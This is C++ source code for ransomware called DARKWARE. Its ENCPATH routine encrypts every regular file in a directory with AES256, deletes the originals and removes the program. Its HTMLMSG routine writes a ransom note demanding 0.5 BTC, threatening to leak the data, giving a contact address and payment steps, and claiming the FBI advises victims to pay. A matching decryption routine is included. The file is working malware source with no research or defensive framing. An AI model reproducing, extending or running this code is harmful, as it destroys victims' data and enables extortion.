#include <random>
#include <string>
#include <fstream>
#include <iostream>
#include <dirent.h>
#include <errno.h>
#include <vector>
#include <cstdio>
#include <stdio.h>
#include "AES256.hpp"
#include "Byte_Block.hpp"
#include "md5.hpp"
#include "cryptspace.hpp"
using namespace std;
int getdir (string dir, vector<string> &files);
const char * RANDOM::HTMLMSG(string KEY){
	string msg="YOUR SERVER HAS BEEN INFECTED BY DARKWARE | YOUR SERVER HAS BEEN INFECTED BY DARKWARE\n"
"Hi,\n"
"Your server has been infected by a ransomware variant called DARKWARE.\n"
"You must send 0.5 BTC to: [ADDRESS] within 2 weeks from now to retrieve your files and prevent them from being leaked!\n"
"We are the only ones in the world that can provide your files for you!\n"
"When your server was hacked, the files were encrypted and sent to a server we control!\n"
"You can e-mail darkware@sigaint.org for support, but please no stupid questions or time\n"
"wasting! Only e-mail if you are prepared to pay or have sent payment! Questions such as:\n"
"can i see files first?\" will be ignored.\n"
"We are business people and treat customers well if you follow what we ask.\n"
"FBI ADVISE FOR YOU TO PAY: https://www.tripwire.com/state-of-security/latest-security-news/ransomware-victims-should-just-pay-the-ransom-says-the-fbi/\n"
"HOW TO PAY:\n"
"You can purchase BITCOINS from many exchanges such as:\n"
"http://okcoin.com\n"
"http://coinbase.com\n"
"http://localbitcoins.com\n"
"http://kraken.com\n"
"When you have sent payment, please send e-mail to darkware@sigaint.org with:\n"
"1) SERVER IP ADDRESS\n"
"2) BTC TRANSACTION ID\n"
"and we will then give you access to files, you can delete files from us when done\n"
"Goodbye!\n";
	ofstream myfile;
	myfile.open("readme.txt");
	myfile <<msg;
	myfile.close();
}
string RANDOM::STR( size_t length ){
		auto randchar = []() -> char{
			const char charset[] ="0123456789"
			"!@#$%^&*"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
			const size_t max_index = (sizeof(charset) - 1);
			return charset[ rand() % max_index ];
		};
		srand(time(0));
		string str(length,0);
		generate_n( str.begin(), length, randchar );
		return str;
	}

void RANDOM::ENCPATH(string WRFile, string KEY, char *ARGVNAME){
	try{
		string dir = string(WRFile);
		vector<string> files = vector<string>();
		getdir(dir,files);
		AES256 aes(KEY);
		for (unsigned int i = 0;i < files.size();i++) {
			string file=files[i];
			if (file[0] != '.' and file!=ARGVNAME){
				ifstream ifs(file, ifstream::in);
				ofstream ofs(file+".darkware", ifstream::out);
				aes.encrypt(ifs, ofs);
				ifs.close();
				ofs.close();
				remove(file.c_str());
			}
		}
		RANDOM::HTMLMSG(KEY);
		remove(ARGVNAME);
		cout<<"SUCCESSFULLY ENCRYPTED "<<endl;
	}catch(std::exception& ex){
		cout<<"Error : "<<ex.what()<<endl;
	}
}
template <typename T, typename U>
T &replace (
          T &str, 
    const U &from, 
    const U &to)
{
    size_t pos;
    size_t offset = 0;
    const size_t increment = to.size();

    while ((pos = str.find(from, offset)) != T::npos)
    {
        str.replace(pos, from.size(), to);
        offset = pos + increment;
    }

    return str;
}

void RANDOM::DECPATH(string WRFile, string KEY,string ARGVNAME){
	try{
		string dir = string(WRFile);;
		vector<string> files = vector<string>();
		getdir(dir,files);
		AES256 aes(KEY);
		for (unsigned int i = 0;i < files.size();i++) {
			string file=files[i];
			if (file[0] != '.' and file!=ARGVNAME and file!="readme.txt"){
				replace(file, ".darkware"s, ""s);
				string k=file+".darkware";
				ifstream ifs(k, ifstream::in);
				ofstream ofs(file, ifstream::out);
				aes.decrypt(ifs, ofs);
				ifs.close();
				ofs.close();
				remove(k.c_str());
			}
		}
		remove(ARGVNAME.c_str());
		cout<<"SUCCESSFULLY DECRYPTED "<<endl;
	}catch(std::exception& ex){
		cout<<"Error : "<<ex.what()<<endl;
	}

}
string RANDOM::HASH(string newhash){
	return md5(newhash);
}

int getdir (string dir, vector<string> &files){
    unsigned char isFile =0x8;
    DIR *dp;
    struct dirent *dirp;
    if((dp  = opendir(dir.c_str())) == NULL) {
        cout << "Error(" << errno << ") opening " << dir << endl;
        return errno;
    }

    while ((dirp = readdir(dp)) != NULL) {
        if( dirp->d_type == isFile){
        files.push_back(string(dirp->d_name));
    }
}
    closedir(dp);
    return 0;
}